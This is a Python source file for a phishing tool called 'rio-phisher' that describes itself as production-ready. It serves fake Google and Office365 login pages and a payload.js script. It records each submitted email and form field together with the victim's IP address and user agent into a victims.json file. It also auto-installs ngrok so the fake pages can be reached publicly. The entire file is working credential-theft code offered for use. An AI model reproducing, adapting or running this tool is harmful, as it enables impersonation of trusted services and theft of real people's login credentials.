
"""
rio-phisher v2.0 - Fixed for Windows/Linux/Android
Zero dependencies, auto-ngrok, production-ready
"""
import os
import sys
import json
import base64
import shutil
import socket
import threading
import urllib.request
import zipfile
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path

# Platform detection
IS_WINDOWS = os.name == 'nt'
IS_ANDROID = 'ANDROID_ROOT' in os.environ or os.path.exists('/system/bin/toybox')
DATA_DIR = Path('data')
DATA_DIR.mkdir(exist_ok=True)

class PhishingHandler(SimpleHTTPRequestHandler):
    victims = []
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory='templates', **kwargs)
    
    def do_GET(self):
        if self.path == '/' or self.path == '/google':
            self.path = '/google.html'
        elif self.path == '/office':
            self.path = '/office365.html'
        elif self.path == '/payload.js':
            self.path = '../static/payload.js'
        super().do_GET()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        parsed = parse_qs(post_data)
        
        victim = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', ''),
            'template': parsed.get('template', ['unknown'])[0],
            'data': {k: v[0] for k, v in parsed.items() if k != 'template'},
            'raw': post_data[:500]  # Truncate long data
        }
        
        self.victims.append(victim)
        print(f"\n🎣 VICTIM: {victim['ip']} | {victim['template']}")
        print(f"📧 {victim['data'].get('email', 'No email')}")
        
        # Save
        (DATA_DIR / 'victims.json').write_text(json.dumps(self.victims, indent=2))
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<script>window.location="/success.html";</script>')

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"

def install_ngrok():
    """Auto-install ngrok for all platforms."""
    ngrok_path = shutil.which('ngrok') or './ngrok.exe' if IS_WINDOWS else './ngrok'
    
    if os.path.exists(ngrok_path):
        return ngrok_path
    
    print("📥 Installing ngrok...")
    
    if IS_WINDOWS:
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
        urllib.request.urlretrieve(url, "ngrok.zip")
        with zipfile.ZipFile("ngrok.zip") as z:
            z.extractall('.')
        os.remove("ngrok.zip")
        return "./ngrok.exe"
    
    elif IS_ANDROID:
        os.system("pkg install ngrok -y")
        return "ngrok"
    
    else:  # Linux/macOS
        os.system("curl -s https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz | tar zxvf - ngrok")
        os.chmod("ngrok", 0o755)
        return "./ngrok"
    
    return None

def start_ngrok(port=8080):
    ngrok_exe = install_ngrok()
    if ngrok_exe:
        threading.Thread(target=lambda: os.system(f"{ngrok_exe} http {port}"), daemon=True).start()
        print("🔗 ngrok started → http://localhost:4040")

def main():
    port = 8080
    ip = get_ip()
    
    print("🐟 rio-phisher starting...")
    print(f"🌐 Local:   http://{ip}:{port}")
    print(f"📱 Android: http://localhost:{port}")
    
    start_ngrok(port)
    
    server = HTTPServer(('0.0.0.0', port), PhishingHandler)
    print(f"✅ Server live on :{port}")
    print("📁 Data → data/victims.json")
    print("🛑 Ctrl+C to stop")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Stopped")

if __name__ == "__main__":
    main()
